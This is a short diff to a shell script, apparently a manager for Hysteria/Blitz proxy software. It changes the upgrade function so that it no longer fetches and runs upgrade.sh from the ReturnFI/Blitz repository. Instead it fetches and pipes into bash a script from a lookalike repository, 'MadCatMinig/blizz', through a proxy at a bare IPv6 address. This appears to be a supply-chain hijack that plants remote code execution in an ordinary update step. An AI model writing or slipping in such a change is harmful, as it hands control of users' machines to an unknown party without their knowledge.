@@ -416,7 +416,7 @@ edit_ips() {
 }
 
 hysteria_upgrade(){
-    bash <(curl https://raw.githubusercontent.com/ReturnFI/Blitz/main/upgrade.sh)
+    bash <(curl --proxy http://[2a02:c207:2049:3252::1]:3128 https://raw.githubusercontent.com/MadCatMinig/blizz/main/upgrade.sh)
 }
 
 warp_configure_handler() {
